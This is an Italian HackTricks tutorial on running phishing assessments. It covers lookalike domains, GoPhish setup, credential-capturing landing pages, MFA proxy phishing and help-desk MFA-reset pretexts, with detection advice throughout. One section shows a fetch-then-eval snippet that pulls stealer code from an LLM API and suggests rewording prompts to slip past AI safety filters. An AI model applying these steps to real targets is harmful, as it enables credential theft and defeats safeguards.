# Metodologia di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Recon della vittima
1. Seleziona il **dominio della vittima**.
2. Esegui una enumerazione web di base **cercando i portali di login** usati dalla vittima e **decidi** quale impersonare.
3. Usa OSINT per **trovare email**.
2. Prepara l'ambiente
1. **Acquista il dominio** che utilizzerai per la valutazione di phishing
2. **Configura i record** relativi al servizio email (SPF, DMARC, DKIM, rDNS)
3. Configura il VPS con **gophish**
3. Prepara la campagna
1. Prepara il **modello email**
2. Prepara la **pagina web** per rubare le credenziali
4. Lancia la campagna!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Il nome di dominio **contiene** una importante **keyword** del dominio originale (es., zelster.com-management.com).
- **hypened subdomain**: Cambia il **punto con un trattino** di un sottodominio (es., www-zelster.com).
- **New TLD**: Stesso dominio utilizzando una **nuova TLD** (es., zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome di dominio con **lettere che sembrano simili** (es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Scambia due lettere** all'interno del nome di dominio (es., zelsetr.com).
- **Singularization/Pluralization**: Aggiunge o rimuove una “s” alla fine del nome di dominio (es., zeltsers.com).
- **Omission**: **Rimuove una** delle lettere dal nome di dominio (es., zelser.com).
- **Repetition:** **Ripete una** delle lettere nel nome di dominio (es., zeltsser.com).
- **Replacement**: Come homoglyph ma meno stealthy. Sostituisce una delle lettere nel nome di dominio, magari con una lettera vicina sulla tastiera (es., zektser.com).
- **Subdomained**: Introduce un **punto** dentro il nome di dominio (es., ze.lster.com).
- **Insertion**: **Inserisce una lettera** nel nome di dominio (es., zerltser.com).
- **Missing dot**: Appende la TLD al nome di dominio. (es., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che alcuni bit memorizzati o in comunicazione si possano ribaltare automaticamente** a causa di vari fattori come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso richiesto inizialmente.

Ad esempio, una singola modifica di bit nel dominio "windows.com" può cambiarlo in "windnws.com".

Gli attacker possono **sfruttare questo registrando più domini bit-flipping** simili al dominio della vittima. L'intento è reindirizzare gli utenti legittimi alla loro infrastruttura.

Per maggiori informazioni leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Puoi cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto che potresti utilizzare.\
Per assicurarti che il dominio scaduto che stai per acquistare **abbia già un buon SEO** puoi controllare come è categorizzato in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** che hai già trovato puoi controllare se puoi brute-forceare i server smtp della vittima. [Scopri come verificare/scoprire indirizzi email qui](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che se gli utenti usano **qualunque web portal per accedere alle loro mail**, puoi verificare se è vulnerabile a **username brute force**, ed esploitare la vulnerabilità se possibile.

## Configuring GoPhish

### Installation

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo e decomprimilo dentro `/opt/gophish` ed esegui `/opt/gophish/gophish`\
Ti verrà fornita una password per l'utente admin sulla porta 3333 nell'output. Quindi, accedi a quella porta e usa quelle credenziali per cambiare la password dell'admin. Potrebbe essere necessario effettuare il tunneling di quella porta in locale:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti **aver già acquistato il dominio** che intendi utilizzare e deve essere **puntato** all'**IP del VPS** dove stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione Mail**

Inizia l'installazione: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** impostandoli sul tuo dominio e **riavvia il tuo VPS.**

Ora, crea un **DNS A record** di `mail.<domain>` che punti all'**ip address** del VPS e un **DNS MX** record che punti a `mail.<domain>`

Ora proviamo a inviare un'email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Interrompi l'esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e verifica il suo funzionamento eseguendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del server di posta e del dominio

### Aspetta e sii credibile

Più un dominio è vecchio, meno è probabile che venga classificato come spam. Dovresti quindi aspettare il più possibile (almeno 1 settimana) prima della valutazione phishing. Inoltre, se pubblichi una pagina relativa a un settore reputazionale, la reputazione ottenuta sarà migliore.

Nota che anche se devi aspettare una settimana, puoi comunque completare ora tutta la configurazione.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Sender Policy Framework (SPF) Record

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cos'è un record SPF [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato all'interno di un record TXT del dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record DMARC (Domain-based Message Authentication, Reporting & Conformance)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> È necessario concatenare entrambi i valori B64 che la chiave DKIM genera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione della tua email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi alla pagina e invia un'email all'indirizzo che ti forniscono:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per questo dovrai **aprire** la porta **25** e vedere la risposta nel file _/var/mail/root_ se invii l'email come root).\
Controlla di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Puoi anche inviare **un messaggio a una casella Gmail sotto il tuo controllo** e controllare i **headers dell'email** nella tua inbox di Gmail: `dkim=pass` dovrebbe essere presente nel campo `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Rimozione dalla blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da Spamhouse.  
Puoi richiedere la rimozione del tuo dominio/IP su: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

Puoi richiedere la rimozione del tuo dominio/IP su [https://sender.office.com/](https://sender.office.com).

## Creare e lanciare una campagna GoPhish

### Profilo mittente

- Imposta un **nome per identificare** il profilo mittente
- Decidi da quale account invierai le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti username e password, ma assicurati di selezionare "Ignore Certificate Errors"

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliato usare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.  
> Consiglio di **inviare le email di test a indirizzi 10min mail** per evitare di finire in blacklist durante i test.

### Modello email

- Imposta un **nome per identificare** il modello
- Poi scrivi un **oggetto** (niente di strano, qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **modello email** (puoi usare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliabile usare qualche firma presa da un'email del cliente. Suggerimenti:

- Inviare un'email a un **indirizzo inesistente** e controllare se la risposta contiene qualche firma.
- Cercare **email pubbliche** come info@ex.com o press@ex.com o public@ex.com e inviare loro un'email aspettando la risposta.
- Provare a contattare **alcune email valide scoperte** e aspettare la risposta

![](<../../images/image (80).png>)

> [!TIP]
> Il Email Template permette anche di **allegare file da inviare**. Se vuoi anche rubare NTLM challenges usando alcuni file/documenti appositamente creati [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Inserisci un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina e fare dei test in locale (magari usando un server Apache) **fino a quando non sei soddisfatto del risultato.** Poi, incolla quel codice HTML nella casella.\
> Nota che se hai bisogno di **usare risorse statiche** per l'HTML (ad esempio CSS e JS) puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento potresti **ridirezionare gli utenti alla pagina principale legittima** della vittima, o reindirizzarli a _/static/migration.html_ per esempio, mettere una **spinning wheel (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è andato a buon fine**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che per usare il template di esempio hai bisogno del nome, cognome e indirizzo email di ogni utente)

![](<../../images/image (163).png>)

### Campagna

Infine, crea una campagna selezionando un nome, l'email template, la landing page, l'URL, la sending profile e il gruppo. Nota che l'URL sarà il link inviato alle vittime

Nota che la **Sending Profile** permette di inviare una email di prova per vedere come apparirà l'email di phishing finale:

![](<../../images/image (192).png>)

> [!TIP]
> Raccomando di **inviare le email di prova a 10min mails addresses** per evitare di essere inseriti in blacklist durante i test.

Una volta che tutto è pronto, lancia la campagna!

## Website Cloning

Se per qualsiasi motivo vuoi clonare il sito web controlla la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune valutazioni di phishing (soprattutto per Red Teams) potresti voler anche **inviare file contenenti qualche tipo di backdoor** (magari un C2 o qualcosa che attivi una procedura di autenticazione).\
Vedi la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è abbastanza furbo perché stai fingendo un sito reale e raccogliendo le informazioni inserite dall'utente. Sfortunatamente, se l'utente non inserisce la password corretta o se l'applicazione che hai falsificato è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

Qui entrano in gioco strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena). Questi tool permettono di generare un attacco MitM. Fondamentalmente, l'attacco funziona così:

1. Tu **fingi il form di login** della pagina reale.
2. L'utente **invia** le sue **credenziali** alla tua pagina fasulla e lo strumento le invia alla pagina reale, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con **2FA**, la pagina MitM la richiederà e una volta che **l'utente la inserisce** lo strumento la invierà alla pagina reale.
4. Una volta autenticato l'utente tu (come attaccante) avrai **catturato le credenziali, la 2FA, il cookie e qualsiasi informazione** di ogni interazione mentre lo strumento esegue il MitM.

### Via VNC

Cosa succede se invece di **inviare la vittima a una pagina malevola** dall'aspetto identico all'originale, la mandi a una **sessione VNC con un browser connesso alla pagina reale**? Potrai vedere cosa fa, rubare la password, l'MFA utilizzata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ovviamente uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio nelle blacklist**. Se appare nella lista, in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per controllare se il tuo dominio è in una blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, ci sono altri modi per capire se la vittima sta **attivamente cercando attività di phishing sospette** come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello della vittima **e/o generare un certificato** per un **subdomain** di un dominio controllato da te **contenente** la **keyword** del dominio della vittima. Se la **vittima** effettua qualsiasi tipo di **interazione DNS o HTTP** con essi, saprai che **sta attivamente cercando** domini sospetti e dovrai essere molto stealth.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious) per valutare se la tua email finirà nella cartella spam oppure se verrà bloccata o avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I gruppi di intrusione moderni sempre più spesso saltano completamente gli lures via email e **mirano direttamente al service-desk / workflow di identity-recovery** per bypassare l'MFA. L'attacco è completamente "living-off-the-land": una volta che l'operatore possiede credenziali valide pivotano con strumenti amministrativi integrati – non è richiesto malware.

### Flusso d'attacco
1. Recon della vittima
* Raccogli dettagli personali & aziendali da LinkedIn, data breaches, GitHub pubblico, ecc.
* Identifica identità ad alto valore (executive, IT, finanza) ed enumera il **processo esatto dell'help-desk** per il reset di password / MFA.
2. Social engineering in tempo reale
* Telefonare, Teams o chat all'help-desk mentre si impersona il target (spesso con **spoofed caller-ID** o **cloned voice**).
* Fornire le PII raccolte in precedenza per superare la verifica basata sulla conoscenza.
* Convincere l'agente a **resettare il segreto MFA** o eseguire un **SIM-swap** su un numero mobile registrato.
3. Azioni immediate post-accesso (≤60 min nei casi reali)
* Stabilire un foothold tramite qualsiasi portale web SSO.
* Enumerare AD / AzureAD con strumenti integrati (senza eseguire binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movimento laterale con **WMI**, **PsExec**, o agenti **RMM** legittimi già whitelisti nell'ambiente.

### Detection & Mitigation
* Tratta il recovery dell'identità via help-desk come un'operazione **privilegiata** – richiedi step-up auth & approvazione manageriale.
* Implementa regole **Identity Threat Detection & Response (ITDR)** / **UEBA** che alertino su:
* Metodo MFA cambiato + autenticazione da nuovo dispositivo / geo.
* Immediata elevazione dello stesso principal (user-→-admin).
* Registra le chiamate all'help-desk e applica un **call-back a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** in modo che gli account appena resettati non ereditino automaticamente token ad alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Le gang commodity compensano il costo delle operazioni high-touch con attacchi di massa che trasformano **motori di ricerca & reti pubblicitarie nel canale di distribuzione**.

1. **SEO poisoning / malvertising** spinge un risultato falso come `chromium-update[.]site` ai primi annunci di ricerca.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser + DB credenziali, poi scarica un **silent loader** che decide – *in realtime* – se distribuire:
* RAT (es. AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (chiave Run del registro + scheduled task)

### Consigli di hardening
* Blocca domini appena registrati e applica **Advanced DNS / URL Filtering** sia sugli *search-ads* che sulle email.
* Restringi l'installazione di software a pacchetti MSI firmati / Store, vieta l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora processi figli dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cerca LOLBins frequentemente abusati dai first-stage loader (es. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Gli attaccanti ora concatenano **LLM & voice-clone APIs** per lures completamente personalizzati e interazione in tempo reale.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automazione|Generare e inviare >100k email / SMS con testi randomizzati & link tracciati.|
|Generative AI|Produrre email *one-off* che fanno riferimento a M&A pubbliche, battute interne dai social; voce deep-fake del CEO in callback scam.|
|Agentic AI|Registrare domini in autonomia, scraping di intel open-source, creare mail di step successivi quando una vittima clicca ma non invia le credenziali.|

**Difesa:**
• Aggiungere **banner dinamici** che evidenzino messaggi inviati da automazione non affidabile (tramite anomalie ARC/DKIM).  
• Implementare **frasi di challenge biometriche vocali** per richieste telefoniche ad alto rischio.  
• Simulare continuamente lures generati da AI nei programmi di awareness – i template statici sono obsoleti.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Gli attaccanti possono consegnare HTML dall'aspetto innocuo e **generare lo stealer a runtime** chiedendo a un'API LLM di fiducia JavaScript, quindi eseguirlo in-browser (ad es., `eval` o `<script>` dinamico).

1. **Prompt-as-obfuscation:** codificare URL di esfiltrazione/stringhe Base64 nel prompt; iterare il wording per bypassare i filtri di sicurezza e ridurre le hallucinations.
2. **Client-side API call:** al caricamento, il JS chiama un LLM pubblico (Gemini/DeepSeek/etc.) o un proxy CDN; solo il prompt/chiamata API è presente nell'HTML statico.
3. **Assemble & exec:** concatenare la risposta ed eseguirla (polimorfica per visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza l'esca (es. LogoKit token parsing) e invia creds all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico colpisce domini LLM ben noti o proxy CDN affidabili; a volte tramite WebSockets verso un backend.
- Nessun payload statico; JS maligno esiste solo dopo il render.
- Generazioni non deterministiche producono **unique** stealers per sessione.

**Idee per il rilevamento**
- Esegui sandbox con JS abilitato; segnala **runtime `eval`/creazione dinamica di script originata da risposte LLM**.
- Caccia front-end POSTs a LLM APIs immediatamente seguiti da `eval`/`Function` sul testo restituito.
- Allerta su domini LLM non autorizzati nel traffico client più successivi credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata al help-desk, annullando il token esistente dell'utente. Qualsiasi successiva richiesta di login appare legittima alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli attaccanti possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquatted e poi indurre l'utente a incollarli in **Win + R**, **Win + X** o in una finestra terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Gli operatori sempre più spesso proteggono i flussi di phishing con un semplice controllo del dispositivo in modo che i crawler desktop non raggiungano mai le pagine finali. Un pattern comune è un piccolo script che verifica se il DOM è touch-capable e invia il risultato a un endpoint server; i client non‑mobile ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobile viene servito il flusso completo.

Snippet client minimale (logica tipica):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logica (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server spesso osservato:
- Imposta un cookie di sessione al primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o placeholder) alle GET successive quando `is_mobile=false`; serve phishing solo se `true`.

Euristiche di rilevamento e hunting:
- query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i non‑mobile; i percorsi legittimi per vittime mobile restituiscono 200 con HTML/JS successivi.
- Bloccare o scrutinare le pagine che condizionano il contenuto esclusivamente su `ontouchstart` o controlli dispositivo simili.

Consigli per la difesa:
- Esegui crawler con fingerprint mobile e JS abilitato per rivelare contenuti gated.
- Allerta su risposte 500 sospette successive a `POST /detect` su domini di nuova registrazione.

## Riferimenti

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
